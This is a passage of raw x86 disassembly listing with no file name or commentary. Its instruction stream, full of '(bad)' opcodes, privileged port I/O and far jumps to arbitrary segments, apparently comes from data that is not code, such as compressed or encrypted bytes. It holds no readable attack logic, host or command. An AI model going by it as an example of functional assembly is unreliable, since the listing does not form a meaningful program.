  420fdf:	add    eax,0xf6cbf6d3
  420fe4:	mov    bl,0x48
  420fe6:	ins    DWORD PTR es:[edi],dx
  420fe7:	adc    edi,DWORD PTR ds:0xe32566c2
  420fed:	lahf   
  420fee:	in     eax,0xf3
  420ff0:	xchg   BYTE PTR [ebx],ah
  420ff2:	sub    DWORD PTR [ebp+0x14],0xffffffc1
  420ff6:	in     eax,0x66
  420ff8:	imul   ebp,DWORD PTR [eax+edx*8],0xffffffe8
  420ffc:	cmp    DWORD PTR [esi-0x3cac8a38],ebx
  421002:	xlat   BYTE PTR ds:[ebx]
  421003:	stos   DWORD PTR es:[edi],eax
  421004:	inc    edi
  421005:	pop    ebx
  421006:	and    BYTE PTR [eax-0x793a07f4],bl
  42100c:	imul   edi,DWORD PTR [ecx+0x44],0xbccc0931
  421013:	cwde   
  421014:	add    eax,0xc5481e85
  421019:	outs   dx,DWORD PTR ds:[esi]
  42101a:	ret    
  42101b:	test   eax,0x5ec16cec
  421020:	ss pop ebx
  421022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421023:	mov    ebx,0xfa981f49
  421028:	mov    edx,0x5a3a315e
  42102d:	ret    
  42102e:	dec    edi
  42102f:	or     ah,BYTE PTR [ebp-0xa]
  421032:	out    dx,eax
  421033:	dec    ebp
  421034:	into   
  421035:	(bad)  
  421036:	lods   al,BYTE PTR ds:[esi]
  421037:	(bad)  
  421038:	jne    0x421060
  42103a:	cmc    
  42103b:	cmp    dh,BYTE PTR [ebx+0x40e07f33]
  421041:	sbb    DWORD PTR [ebp-0x39],ebp
  421044:	ror    BYTE PTR [edi-0x2e57a953],cl
  42104a:	lahf   
  42104b:	fidivr WORD PTR [edi]
  42104d:	push   ebp
  42104e:	jg     0x421081
  421050:	out    0xc0,al
  421052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421053:	xlat   BYTE PTR ds:[ebx]
  421054:	jae    0x4210bb
  421056:	jle    0x42106b
  421058:	mov    bl,0xd8
  42105a:	mov    eax,0x45e4264f
  42105f:	retf   
  421060:	push   ebp
  421061:	xlat   BYTE PTR ds:[ebx]
  421062:	push   0xffffffeb
  421064:	aad    0xb5
  421066:	addr16 iret 
  421068:	xchg   esp,eax
  421069:	ja     0x4210ae
  42106b:	dec    esp
  42106c:	adc    dh,BYTE PTR [ecx-0x52]
  42106f:	loopne 0x421046
  421071:	pop    eax
  421072:	mov    DWORD PTR [ebx+0x4e258379],esp
  421078:	inc    edx
  421079:	call   0xb7240c92
  42107e:	mov    ebx,0x16625404
  421083:	jns    0x42105c
  421085:	leave  
  421086:	ficomp DWORD PTR [esi-0x7d]
  421089:	mov    dh,0x80
  42108b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42108c:	mov    bl,0xa8
	...
  42109a:	pop    esp
  42109b:	mov    dh,BYTE PTR [edi-0x23800895]
  4210a1:	mov    edi,0x2b60ebfc
  4210a6:	(bad)  
  4210a9:	cld    
  4210aa:	hlt    
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ah,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [edi+edx*8],bl
  4210b4:	inc    edi
  4210b5:	inc    esi
  4210b6:	ins    BYTE PTR es:[edi],dx
  4210b7:	in     eax,0x96
  4210b9:	mov    dh,0xa1
  4210bb:	ret    
  4210bc:	push   ss
  4210bd:	xor    al,0x99
  4210bf:	sub    eax,edx
  4210c1:	mov    edi,0xa5583f8c
  4210c6:	gs ja  0x421060
  4210c9:	or     esi,DWORD PTR [edx]
  4210cb:	rcl    BYTE PTR [edi-0x4ee65b7],0x1f
  4210d2:	jb     0x4210a1
  4210d4:	jmp    0x8095eafd
  4210d9:	mov    esp,0x6aff500c
  4210de:	out    dx,al
  4210df:	xlat   BYTE PTR ds:[ebx]
  4210e0:	mov    ebx,0x4cb3f63a
  4210e5:	adc    DWORD PTR [ebx+0x28e06a9a],eax
  4210eb:	cmp    BYTE PTR ds:0x40b1a0ab,al
  4210f1:	xchg   ebx,eax
  4210f2:	loope  0x4210bb
  4210f4:	push   ecx
  4210f5:	push   esi
  4210f6:	imul   edx,DWORD PTR [ebp+0x10],0xe1d5b09d
  4210fd:	icebp  
  4210fe:	out    dx,al
  4210ff:	fs out dx,eax
  421101:	dec    edi
  421102:	xor    BYTE PTR [eax],bl
  421104:	mov    esi,0x87fb7c6c
  421109:	lods   al,BYTE PTR ds:[esi]
  42110a:	push   0x49
  42110c:	fistp  DWORD PTR [edi]
  42110e:	and    ebp,DWORD PTR [ebp+edx*8+0x17836af5]
  421115:	jecxz  0x4210d0
  421117:	jae    0x421184
  421119:	test   BYTE PTR [ebx+0x39da9829],0xab
  421120:	das    
  421121:	sbb    DWORD PTR [ebx],0xffffffab
  421124:	(bad)  
  421126:	(bad)  
  421127:	mov    edi,0xf9070d46
  42112c:	dec    eax
  42112d:	mov    DWORD PTR [edx],esp
  42112f:	rsqrtps xmm0,XMMWORD PTR [eax+esi*2]
  421133:	test   al,0xc6
  421135:	xor    BYTE PTR [ecx+0x75],0x46
  421139:	aas    
  42113a:	cmp    DWORD PTR [eax-0x18],0xffffffa0
  42113e:	in     al,dx
  42113f:	sbb    eax,0xdfd73000
  421144:	jns    0x42116e
  421146:	mov    WORD PTR [ecx-0x16ba237a],es
  42114c:	outs   dx,DWORD PTR ds:[esi]
  42114d:	push   ecx
  42114e:	loop   0x421182
  421150:	sub    DWORD PTR [ecx+0x423be27c],edi
  421156:	sti    
  421157:	pop    ds
  421158:	lods   eax,DWORD PTR ds:[esi]
  421159:	fnsave [ebx+edx*4]
  42115c:	mov    eax,es
  42115e:	fistp  WORD PTR [edi-0x24]
  421161:	test   eax,0x66b5f47d
  421166:	sub    al,0x24
  421168:	and    ebx,DWORD PTR [ebp+0x61398288]
  42116e:	lods   eax,DWORD PTR ds:[esi]
  42116f:	mov    DWORD PTR [edi+edx*1+0x679380ea],eax
  421176:	sbb    dh,dh
  421178:	jae    0x421157
  42117a:	xor    DWORD PTR [ebx-0x6c72e1d7],eax
  421180:	sbb    cl,0x4d
  421183:	push   esi
  421184:	addr16 xor al,0x8
  421187:	cmp    ebp,DWORD PTR [ecx+eax*2+0x37]
  42118b:	cmp    esi,DWORD PTR [ebp+0x2f]
  42118e:	mov    eax,0x48434d2d
  421193:	sbb    ebx,DWORD PTR [ebp+eax*1+0x69a6581a]
  42119a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42119b:	data16 es cmp bl,ah
  42119f:	cmc    
  4211a0:	cmp    eax,0x4c681481
  4211a5:	push   edi
  4211a6:	sti    
  4211a7:	div    BYTE PTR [ebx+ebx*8-0x27]
  4211ab:	mov    bl,0x49
  4211ad:	sbb    eax,0x8dc4be28
  4211b2:	ret    
  4211b3:	ud0    ebp,DWORD PTR [eax+0x681acf01]
  4211ba:	dec    eax
  4211bb:	xor    ah,BYTE PTR [edx-0x4b]
  4211be:	lock push 0xaa04c41e
  4211c4:	dec    edi
  4211c5:	cld    
  4211c6:	ret    0xe667
  4211c9:	dec    edx
  4211ca:	clc    
  4211cb:	jnp    0x421242
  4211cd:	std    
  4211ce:	inc    ecx
  4211cf:	push   esi
  4211d0:	les    edx,FWORD PTR [edi+0x38]
  4211d3:	ja     0x421164
  4211d5:	dec    edx
  4211d6:	scas   al,BYTE PTR es:[edi]
  4211d7:	fs and ch,0x5b
  4211db:	imul   esi,DWORD PTR [ecx],0x57c95d7c
  4211e1:	mov    ch,cl
  4211e3:	shr    DWORD PTR [edx+0x5b],1
  4211e6:	loope  0x42117f
  4211e8:	push   0x65fbacf4
  4211ed:	dec    esi
  4211ee:	sahf   
  4211ef:	loop   0x421226
  4211f1:	cmp    bh,cl
  4211f3:	std    
  4211f4:	in     eax,0x83
  4211f6:	test   BYTE PTR [edx+0x17],bl
  4211f9:	stos   BYTE PTR es:[edi],al
  4211fa:	les    ebp,FWORD PTR [ebp+0x67d0b14b]
  421200:	push   edx
  421201:	test   eax,0x26139653
  421206:	sti    
  421207:	call   0xa466:0x643af801
  42120e:	fisttp WORD PTR [esi-0x4f]
  421211:	adc    DWORD PTR [esi-0x62],edi
  421214:	or     ebx,ebp
  421216:	out    0x4f,al
  421218:	and    ebx,edx
  42121a:	inc    edi
  42121b:	jmp    0x1d56:0xccc1583
  421222:	or     eax,0xa14c076b
  421227:	mov    bl,0x8
  421229:	push   esi
  42122a:	fdiv   DWORD PTR [edi-0x25c196db]
  421230:	or     eax,0x51e6bb0e
  421235:	arpl   WORD PTR [eax],di
  421237:	out    dx,eax
  421238:	jmp    0x5c9a:0x333360aa
  42123f:	or     dl,bh
  421241:	hlt    
  421242:	mov    ?,WORD PTR [edi+0x7a]
  421245:	pop    esi
  421246:	add    bp,bx
  421249:	(bad)  
  42124a:	es int3 
  42124c:	jecxz  0x421286
  42124e:	jmp    0xf203:0xd4fc1e89
  421255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421256:	arpl   WORD PTR [eax],bp
  421258:	xor    eax,0x7fd74d91
  42125d:	out    0x19,eax
  42125f:	mov    ch,0xe5
  421261:	loop   0x4212c8
  421263:	repz das 
  421265:	and    eax,0xffac6dc2
  42126a:	fstp   TBYTE PTR [edx]
  42126c:	mov    bl,0xff
  42126e:	xchg   esi,eax
  42126f:	jmp    0x5913:0x3da6bf2b
  421276:	inc    esi
  421277:	cmp    al,0xe9
  421279:	lods   eax,DWORD PTR ds:[esi]
  42127a:	popf   
  42127b:	es data16 jle 0x4212d1
  42127f:	pushf  
  421280:	mov    eax,ds:0xa3534c8
  421285:	inc    edi
  421286:	icebp  
  421287:	sbb    eax,DWORD PTR [edi+0x485bc627]
  42128d:	hlt    
  42128e:	rcl    DWORD PTR [ecx-0x40],0x25
  421292:	dec    esp
  421293:	cmp    ecx,ebx
  421295:	test   eax,0x73294d25
  42129a:	mov    ch,0xa6
  42129c:	xchg   BYTE PTR [esi+0x1],ah
  42129f:	cmp    al,0x1f
  4212a1:	xchg   edi,eax
  4212a2:	loop   0x4212d0
  4212a4:	jmp    FWORD PTR [bp+0x14]
  4212a8:	or     al,0xd4
  4212aa:	inc    ebp
  4212ab:	rcl    BYTE PTR [edx+0x8],0x0
	...
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx+0x5d8ad18c]
  4212ca:	lock mov es,WORD PTR [ecx]
  4212cd:	add    ah,bh
  4212cf:	add    DWORD PTR [eax],eax
  4212d1:	add    bh,cl
  4212d3:	jns    0x42125e
  4212d5:	test   al,0xb9
  4212d7:	dec    edx
  4212d8:	sbb    BYTE PTR [ecx],0xa7
  4212db:	scas   al,BYTE PTR es:[edi]
  4212dc:	in     eax,dx
  4212dd:	lock (bad) 
  4212df:	sahf   
  4212e0:	ss out 0x9d,al
  4212e3:	imul   ebx,DWORD PTR [edx+edi*2+0x67],0x47
  4212e8:	mov    edx,0x270f8533
  4212ed:	and    DWORD PTR [bp+si],eax
  4212f0:	leave  
  4212f1:	mov    edx,ebx
  4212f3:	cmp    eax,DWORD PTR [edi]
  4212f5:	sti    
  4212f6:	ja     0x421342
  4212f8:	dec    ecx
  4212f9:	inc    esp
  4212fa:	cmp    BYTE PTR [ebp-0x4e1ab677],bh
  421300:	mov    dl,0xb8
  421302:	scas   eax,DWORD PTR es:[edi]
  421303:	add    eax,0x69caa56b
  421308:	data16 add al,0x57
  42130b:	es push eax
  42130d:	dec    DWORD PTR [esi+0x7052b602]
  421313:	cmp    ah,dl
  421315:	add    bh,BYTE PTR [edi]
  421317:	inc    esp
  421318:	ins    BYTE PTR es:[edi],dx
  421319:	dec    esp
  42131a:	hlt    
  42131b:	add    al,0x95
  42131d:	adc    BYTE PTR [ebp-0x3b],cl
  421320:	sub    DWORD PTR [edi],edx
  421322:	ds jp  0x421389
  421325:	enter  0xd0a6,0x98
  421329:	inc    esp
  42132a:	(bad)  
  42132b:	sbb    al,0x5a
  42132d:	inc    eax
  42132e:	jae    0x421322
  421330:	mov    al,0xa7
  421332:	mov    es,WORD PTR [ecx+edx*4]
  421335:	stc    
  421336:	pop    esp
  421337:	xor    bl,ch
  421339:	loope  0x4212f5
  42133b:	jl     0x42130a
  42133d:	push   esp
  42133e:	push   edi
  42133f:	lock or eax,DWORD PTR [ebx]
  421342:	dec    ebp
  421343:	call   0xc1f8b476
  421348:	scas   al,BYTE PTR es:[edi]
  421349:	mov    ebx,0x6be21297
  42134e:	pop    edx
  42134f:	jp     0x42134c
  421351:	pop    eax
  421352:	xchg   ebp,eax
  421353:	sbb    DWORD PTR [edx],0xe6398a8c
  421359:	and    edx,DWORD PTR [eax+0x32]
  42135c:	neg    BYTE PTR [esi-0x6f1da430]
  421362:	jg     0x42134e
  421364:	jmp    0x78e8ebf3
  421369:	inc    ecx
  42136a:	xor    dh,BYTE PTR [eax+0x402b5392]
  421370:	adc    edi,DWORD PTR [ebx-0x682a15e]
  421376:	add    al,0x76
  421378:	push   ds
  421379:	loope  0x421311
  42137b:	jl     0x42132e
  42137d:	sub    eax,0xf8e02705
  421382:	cmp    ebx,DWORD PTR [edi]
  421384:	ja     0x4213ee
  421386:	add    edi,DWORD PTR [edx+0x74275d9d]
  42138c:	enter  0x1204,0x1f
  421390:	pop    ebx
  421391:	div    BYTE PTR [edx-0xc]
  421394:	jle    0x421380
  421396:	add    ecx,ebx
  421398:	cmp    dl,BYTE PTR [edx-0x1f55206c]
  42139e:	sbb    eax,0xf04dc53b
  4213a3:	sahf   
  4213a4:	xchg   ebx,eax
  4213a5:	inc    esp
  4213a6:	cmp    eax,DWORD PTR [edi-0x66]
  4213a9:	push   edx
  4213aa:	xchg   esi,eax
  4213ab:	imul   edx,DWORD PTR [edi],0x48
  4213ae:	jne    0x4213e8
  4213b0:	sub    BYTE PTR [edx-0x15],dh
  4213b3:	(bad)  
  4213b4:	mov    eax,0x45c629f
  4213b9:	mov    BYTE PTR [ecx-0x59559c68],dh
  4213bf:	xor    DWORD PTR [eax],edx
  4213c1:	xor    esp,DWORD PTR [ebp-0x43]
  4213c4:	ins    DWORD PTR es:[edi],dx
  4213c5:	test   eax,0x7a04d95e
  4213ca:	pop    ebx
  4213cb:	loopne 0x4213cd
  4213cd:	cmc    
  4213ce:	popf   
  4213cf:	or     DWORD PTR [eax-0x7],0xa4cd34c4
  4213d6:	jp     0x421399
  4213d8:	push   ebp
  4213d9:	cdq    
  4213da:	lods   eax,DWORD PTR ds:[esi]
  4213db:	and    DWORD PTR [edi],esp
  4213dd:	sahf   
  4213de:	adc    DWORD PTR [ebp-0x450bdc10],eax
  4213e4:	push   edi
  4213e5:	jg     0x4213f3
  4213e7:	jl     0x4213ed
  4213e9:	mov    dh,0xc8
  4213eb:	pop    edi
  4213ec:	jbe    0x4213ac
  4213ee:	mov    ds:0x42957d5b,eax
  4213f3:	in     eax,0x23
  4213f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213f6:	rcl    BYTE PTR [esi-0x478921f2],0xb
  4213fd:	aad    0x49
  4213ff:	jne    0x4213de
  421401:	cwde   
  421402:	imul   ebp,DWORD PTR gs:[ebx-0x41],0xffffffe5
  421407:	ds jmp 0x42140e
  42140a:	fst    DWORD PTR [ebx]
  42140c:	(bad)  
  42140d:	outs   dx,BYTE PTR ds:[esi]
  42140e:	pop    es
  42140f:	je     0x42144e
  421411:	and    esp,esi
  421413:	push   es
  421414:	nop
  421415:	mov    DWORD PTR [ebx+0x3e],ebx
  421418:	or     DWORD PTR [edx],edi
  42141a:	jbe    0x4213e6
  42141c:	cmc    
  42141d:	mov    al,ds:0x6d9b7add
  421422:	or     cl,bh
  421424:	fwait
  421425:	inc    ebp
  421426:	cld    
  421427:	ss mov eax,0x61555625
  42142d:	adc    al,0x53
  42142f:	adc    BYTE PTR [edx+0x20],bl
  421432:	dec    esp
  421433:	not    BYTE PTR [eax+0x1930a54e]
  421439:	dec    eax
  42143a:	sti    
  42143b:	pop    esi
  42143c:	imul   ecx,DWORD PTR [eax],0xffffffed
  42143f:	sub    DWORD PTR [eax-0x74d7ae69],esi
  421445:	mov    DWORD PTR [esi-0x3f],eax
  421448:	ds sub eax,0xb3ec2891
  42144e:	xor    dl,al
  421450:	jmp    0x4213d2
  421452:	and    al,0x28
  421454:	cmp    DWORD PTR [ecx+0x28],esp
  421457:	jb     0x4214d1
  421459:	cld    
  42145a:	(bad)  
  42145b:	xor    eax,0x4ec95772
  421460:	pop    es
  421461:	cld    
  421462:	lods   al,BYTE PTR ds:[esi]
  421463:	aad    0x74
  421465:	jecxz  0x42143b
  421467:	retf   0x2b84
  42146a:	adc    al,0x21
  42146c:	pop    edx
  42146d:	imul   ebp,DWORD PTR [edx],0x21d9c913
  421473:	std    
  421474:	mov    dl,0xb2
  421476:	shl    DWORD PTR [edx+eax*4-0x13],cl
  42147a:	cwde   
  42147b:	loop   0x42142f
  42147d:	sub    DWORD PTR [edx+0x4700ed94],0xfffca13
  421487:	lds    edx,FWORD PTR ds:0x35f27432
  42148d:	mov    esi,0xe1ce98b
  421492:	cmp    dl,BYTE PTR [eax-0x36d0102b]
  421498:	into   
  421499:	pop    es
  42149a:	xor    DWORD PTR [edi-0x15],0xffffffe8
  42149e:	adc    edx,DWORD PTR fs:[edx+0x47]
  4214a2:	xchg   ebp,eax
  4214a3:	push   ecx
  4214a4:	fdivr  DWORD PTR [ebx+eax*4-0x2fc235e4]
  4214ab:	pop    eax
  4214ac:	shr    BYTE PTR [ecx-0x2493d329],1
  4214b2:	es clc 
  4214b4:	and    BYTE PTR [ebp+0x31a811ca],cl
  4214ba:	jmp    0x49e6:0xc278a08c
  4214c1:	shl    BYTE PTR [edx+0x541563a3],0x64
  4214c8:	xor    BYTE PTR [ecx],ah
  4214ca:	or     DWORD PTR [edi],0xffffffb8
  4214cd:	rol    DWORD PTR [eax],1
	...
  4214d7:	add    BYTE PTR [eax],al
  4214d9:	add    BYTE PTR [ebp-0x15b01f1],bl
  4214df:	cmc    
  4214e0:	fistp  QWORD PTR [edi]
  4214e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	leave  
  4214e7:	jmp    0x421530
  4214e9:	(bad)  
  4214eb:	nop
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	cld    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [esi-0x1e],dl
  4214f4:	add    dl,ah
  4214f6:	shl    DWORD PTR [ecx],cl
  4214f8:	jae    0x42152b
  4214fa:	in     eax,dx
  4214fb:	gs clc 
  4214fd:	nop
  4214fe:	sbb    dl,ah
  421500:	adc    eax,0xefd095c3
  421505:	jnp    0x421538
  421507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421508:	cwde   
  421509:	or     ecx,DWORD PTR ds:0x7ea13614
  42150f:	test   BYTE PTR [ebx+ebp*8-0x7e8db62a],cl
  421516:	dec    edx
  421517:	push   ds
  421518:	pop    esi
  421519:	sbb    eax,DWORD PTR [ecx]
  42151b:	mov    WORD PTR [ebx-0x2],es
  42151e:	mov    ds:0x4b72d810,eax
  421523:	fisttp QWORD PTR [ebx+0x7ac3975f]
  421529:	(bad)  
  42152a:	out    0xac,eax
  42152c:	push   eax
  42152d:	aaa    
  42152e:	sbb    bl,ah
  421530:	dec    edi
  421531:	mul    BYTE PTR [ebx-0x6f]
  421534:	push   0x48e40807
  421539:	dec    edx
  42153a:	inc    ebp
  42153b:	add    al,dl
  42153d:	mov    ah,0x8f
  42153f:	sub    bh,ah
  421541:	pop    esp
  421542:	cmp    al,0xc2
  421544:	cmp    edx,ecx
  421546:	in     al,0xfe
  421548:	fldenv [esi-0x7169264d]
  42154e:	pop    esi
  42154f:	and    al,BYTE PTR [ebx+0x5c64fffa]
  421555:	aam    0xe1
  421557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421558:	leave  
  421559:	int3   
  42155a:	sbb    BYTE PTR [esi],ah
  42155c:	dec    eax
  42155d:	adc    DWORD PTR [ecx-0x71],0x2b
  421561:	xchg   edi,eax
  421562:	mov    BYTE PTR [edi+0x33],ah
  421565:	add    esi,DWORD PTR [ebx+ecx*2]
  421568:	jg     0x4215bd
  42156a:	and    bh,BYTE PTR es:[ebx+0x26]
  42156e:	sbb    ebp,DWORD PTR [ebp+0x55]
  421571:	and    DWORD PTR [ecx-0xc],0x29
  421575:	xchg   BYTE PTR [edx+0x7dea881a],bh
  42157b:	and    edx,ebx
  42157d:	pop    edx
  42157e:	and    DWORD PTR [ebp+eax*1+0x70607dc1],esi
  421585:	push   esp
  421586:	mov    ebx,0xfea20f1e
  42158b:	jnp    0x4215f5
  42158d:	cmp    eax,0x1afdf7f9
  421592:	int    0x7a
  421594:	mov    DWORD PTR [esi+0x45],edi
  421597:	dec    ecx
  421598:	leave  
  421599:	(bad)  [esi]
  42159b:	jecxz  0x421591
  42159d:	jle    0x421565
  42159f:	mov    al,BYTE PTR [edx+0xd880d4e]
  4215a5:	loopne 0x42160d
  4215a7:	mov    bl,0x80
  4215a9:	imul   DWORD PTR [esp+ecx*4]
  4215ac:	dec    edx
  4215ad:	lock mov ch,0xa4
  4215b0:	loopne 0x4215be
  4215b2:	or     BYTE PTR [ecx],dh
  4215b4:	in     al,0x3f
  4215b6:	ins    DWORD PTR es:[edi],dx
  4215b7:	inc    esi
  4215b8:	or     ebx,DWORD PTR [ecx+0x11e2e055]
  4215be:	cmp    eax,0x69863a5c
  4215c3:	mov    ah,0xe9
  4215c5:	sbb    bh,cl
  4215c7:	gs int 0x7a
  4215ca:	xor    eax,0xe7d376dc
  4215cf:	mov    BYTE PTR [ecx-0x7],bh
  4215d2:	push   ebp
  4215d3:	push   ds
  4215d4:	cld    
  4215d5:	mov    ds:0xa25051e6,al
  4215da:	add    DWORD PTR [edi],ebx
  4215dc:	pop    edx
  4215dd:	shl    BYTE PTR [eax-0x2fbb58da],cl
  4215e3:	(bad)  
  4215e4:	xlat   BYTE PTR ds:[ebx]
  4215e5:	xor    DWORD PTR [esi],edx
  4215e7:	call   0xab8e:0xcaaeb9ed
  4215ee:	mov    ds:0x60a74eed,al
  4215f3:	sbb    DWORD PTR [ecx+0xa],esi
  4215f6:	mul    dl
  4215f8:	pop    es
  4215f9:	cmc    
  4215fa:	mov    bh,0xd6
  4215fc:	addr16 adc eax,0xaa638f0e
  421602:	test   bl,dl
  421604:	pushf  
  421605:	and    al,0xb3
  421607:	cmp    eax,0x500ea7b4
  42160c:	call   0xf1e4:0xda6c47c2
  421613:	push   esi
  421614:	jecxz  0x42162c
  421616:	push   ds
  421617:	sub    eax,0xa7b71e9
  42161c:	cmp    BYTE PTR ds:0x4bbabffe,al
  421622:	repz or DWORD PTR [ebx+0x0],ebp
  421626:	in     eax,dx
  421627:	stos   BYTE PTR es:[edi],al
  421628:	scas   eax,DWORD PTR es:[edi]
  421629:	mov    ds:0x648e05ca,eax
  42162e:	pushf  
  42162f:	aam    0x3d
  421631:	test   DWORD PTR [ebx],ebx
  421633:	mov    BYTE PTR [edi-0x5643a8fa],al
  421639:	xchg   esp,eax
  42163a:	call   0xf4dc2857
  42163f:	xchg   DWORD PTR [edi+0x3d],ebp
  421642:	or     BYTE PTR [ebx+0x2232a6c3],cl
  421648:	sub    BYTE PTR [esi-0x5fbddd78],bh
  42164e:	jmp    0x4215f5
  421650:	sbb    DWORD PTR [ebp-0x9],0x10
  421654:	push   0xffffffdf
  421656:	(bad)  
  421657:	mov    eax,eax
  421659:	xor    dh,0xce
  42165c:	pusha  
  42165d:	scas   al,BYTE PTR es:[edi]
  42165e:	inc    edx
  42165f:	ret    0x6f99
  421662:	cli    
  421663:	aad    0x12
  421665:	mov    eax,0x3bf8537b
  42166a:	xchg   BYTE PTR [ebx],bh
  42166c:	mov    bh,0x72
  42166e:	stc    
  42166f:	jmp    0x7e8f7503
  421674:	rsqrtps xmm2,xmm1
  421677:	imul   esi,esi,0x73527f99
  42167d:	rcl    BYTE PTR [esi+0x26],0xf9
  421681:	pop    edx
  421682:	lds    esp,FWORD PTR [edx-0x3b6fa807]
  421688:	ds and al,0xb2
  42168b:	add    al,0x2a
  42168d:	sbb    al,0x1a
  42168f:	scas   al,BYTE PTR es:[edi]
  421690:	and    dl,BYTE PTR [edi+0x2c]
  421693:	jmp    0x13a8bb73
  421698:	jmp    0xc03d:0x2d8e5586
  42169f:	mov    ds:0x48c69b3,al
  4216a4:	iret   
  4216a5:	add    dl,dh
  4216a7:	iret   
  4216a8:	pop    ss
  4216a9:	call   0xd04e:0x3a8efb2c
  4216b0:	jle    0x421728
  4216b2:	retf   
  4216b3:	add    BYTE PTR [ebp-0x6f35a34f],ch
  4216b9:	inc    ebp
  4216ba:	sahf   
  4216bb:	test   eax,0x798193ef
  4216c0:	jne    0x421654
  4216c2:	clc    
  4216c3:	adc    eax,DWORD PTR [esi+0x52a7a412]
  4216c9:	dec    esi
  4216ca:	fdiv   st(6),st
  4216cc:	jo     0x421708
  4216ce:	sub    bh,0xbb
  4216d1:	stos   DWORD PTR es:[edi],eax
  4216d2:	ror    ecx,cl
  4216d4:	clc    
  4216d5:	call   0x7a7a:0x782c248
  4216dc:	fsubr  DWORD PTR [ecx-0x75460017]
  4216e2:	fs mov dh,0x79
  4216e5:	jmp    0x3f8c:0xd863c26b
  4216ec:	pop    ebx
  4216ed:	cmp    eax,DWORD PTR [eax]
	...
  4216f7:	add    BYTE PTR [eax],al
  4216f9:	add    BYTE PTR [eax],ah
  4216fb:	push   ss
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	test   BYTE PTR [ebx+ebp*1],0x52
  421709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42170a:	call   0xfc4218a1
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [ebx-0x44],dl
  421714:	cmp    eax,0x4926c57c
  421719:	into   
  42171a:	lods   al,BYTE PTR ds:[esi]
  42171b:	sbb    eax,0xf9312e03
  421720:	and    eax,0xff568347
  421725:	and    dl,ch
  421727:	dec    esp
  421728:	enter  0x67b7,0x7d
  42172c:	mov    ch,0xa4
  42172e:	sub    ebx,0x77
  421731:	cwde   
  421732:	mov    esp,0x86ec593a
  421737:	sub    esp,esi
  421739:	mov    ds:0x14cf0c28,eax
  42173e:	into   
  42173f:	in     eax,0xda
  421741:	lods   eax,DWORD PTR ds:[esi]
  421742:	ss aad 0xd0
  421745:	pop    esi
  421746:	sbb    eax,0xffe038a8
  42174b:	lea    ebx,[eax]
  42174d:	into   
  42174e:	jo     0x421756
  421750:	stos   BYTE PTR es:[edi],al
  421751:	dec    ebx
  421752:	jle    0x42173a
  421754:	in     eax,0x81
  421756:	in     eax,0x9e
  421758:	lahf   
  421759:	clc    
  42175a:	jge    0x421700
  42175c:	mov    ds:0x538b2a9f,al
  421761:	or     BYTE PTR [ebx-0x7ae30291],cl
  421767:	lods   al,BYTE PTR ds:[esi]
  421768:	scas   al,BYTE PTR es:[di]
  42176a:	xchg   edi,eax
  42176b:	add    ebx,DWORD PTR [esi-0x41ec7cdf]
  421771:	in     eax,dx
  421772:	push   esp
  421773:	shr    bl,cl
  421775:	adc    DWORD PTR [ebx],ebp
  421777:	ret    0x952a
  42177a:	jge    0x421748
  42177c:	imul   ecx,DWORD PTR [ebp-0x1cbcce71],0xffffffa8
  421783:	js     0x421798
  421785:	sar    edx,1
  421787:	pop    DWORD PTR [eax-0x6f]
  42178a:	xchg   edi,eax
  42178b:	aad    0x6f
  42178d:	mov    ecx,0xd3c66084
  421792:	cmp    al,0x7a
  421794:	clc    
  421795:	stc    
  421796:	xchg   esi,eax
  421797:	mov    ecx,0x1332a001
  42179c:	test   eax,0x5e2960ca
  4217a1:	sbb    esi,esi
  4217a3:	(bad)  
  4217a4:	fidivr WORD PTR ds:0xfd078fd1
  4217aa:	mov    eax,0x46cea7f7
  4217af:	sub    dh,bl
  4217b1:	jo     0x4217c5
  4217b3:	add    BYTE PTR [ebp-0x5a],ah
  4217b6:	iret   
  4217b7:	push   ebp
  4217b8:	gs jb  0x421806
  4217bb:	or     edi,DWORD PTR [ebx+0xd]
  4217be:	xchg   edx,eax
  4217bf:	loop   0x421822
  4217c1:	add    dl,BYTE PTR [edx+0x3ed4d49b]
  4217c7:	shr    ch,cl
  4217c9:	add    eax,0xbb0ffb26
  4217ce:	mov    al,0x5f
  4217d0:	leave  
  4217d1:	dec    edi
  4217d2:	stos   BYTE PTR es:[edi],al
  4217d3:	mov    esi,edx
  4217d5:	fidivr WORD PTR [ebx-0x3b8d25e6]
  4217db:	xchg   ah,dh
  4217dd:	cld    
  4217de:	bound  eax,QWORD PTR [ebx-0x52]
  4217e1:	xchg   ebx,eax
  4217e2:	push   edx
  4217e3:	dec    ebx
  4217e4:	(bad)  
  4217e5:	pop    ecx
  4217e6:	pop    ebp
  4217e7:	jle    0x421862
  4217e9:	cld    
  4217ea:	mov    bh,0x53
  4217ec:	in     al,dx
  4217ed:	xlat   BYTE PTR ds:[ebx]
  4217ee:	pop    edx
  4217ef:	cli    
  4217f0:	jmp    0x4217ee
  4217f2:	ds mov bl,0x4d
  4217f5:	pop    edx
  4217f6:	loop   0x42183d
  4217f8:	push   edi
  4217f9:	into   
  4217fa:	mov    dl,BYTE PTR ds:0xab1f5db9
  421800:	cld    
  421801:	cmp    al,0x6a
  421803:	adc    ch,BYTE PTR [edi-0x18]
  421806:	pusha  
  421807:	cwde   
